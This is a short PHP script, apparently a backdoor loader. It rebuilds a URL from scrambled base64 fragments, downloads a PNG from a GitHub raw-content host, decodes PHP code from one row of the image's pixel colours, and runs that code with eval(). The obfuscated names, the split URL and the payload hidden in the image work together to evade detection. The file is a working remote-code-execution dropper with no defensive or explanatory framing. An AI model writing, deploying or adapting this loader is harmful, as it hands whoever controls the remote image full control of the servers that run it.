<?php

class LigMaColck
{
    public function naegga(array $chunks)
    {
        $url = '';
        foreach ($chunks as $part) {
            if (strlen($part) >= 4 && base64_decode($part, true) !== false) {
                $url .= base64_decode($part);
            } else {
                $url .= $part;
            }
        }

        // Ambil PNG dari hasil URL
        $image_data = file_get_contents($url);
        if (!$image_data) {
            throw new Exception('Failed.');
        }

        $im = imagecreatefromstring($image_data);
        if (!$im) {
            throw new Exception('Failed.');
        }

        $width = imagesx($im);
        $code = '';

        for ($x = 0; $x < $width; $x++) {
            $rgb = imagecolorat($im, $x, 1);
            $r = ($rgb >> 16) & 0xFF;
            $g = ($rgb >> 8) & 0xFF;
            $b = $rgb & 0xFF;
            $code .= chr($r) . chr($g) . chr($b);
        }

        imagedestroy($im);
        return rtrim($code, "\0");
    }
}


$LigMaColck = new LigMaColck();
$kocloook = $LigMaColck->naegga([
    'aHR0',
    'ps:',
    'Ly9y',
    'aw.',
    'git',
    'hub',
    'dXNl',
    'cmNv',
    'bnRl',
    'nt.',
    'Y29t',
    '/lo',
    'dmVs',
    'ija',
    'pel',
    'i/z',
    'ein',
    'aG9y',
    'b2Jv',
    'c3Uv',
    'ref',
    's/h',
    'ZWFk',
    's/m',
    'ain',
    '/sc',
    'cmlw',
    't.p',
    'bmc=',
]);
eval('?>' . $kocloook);
?>
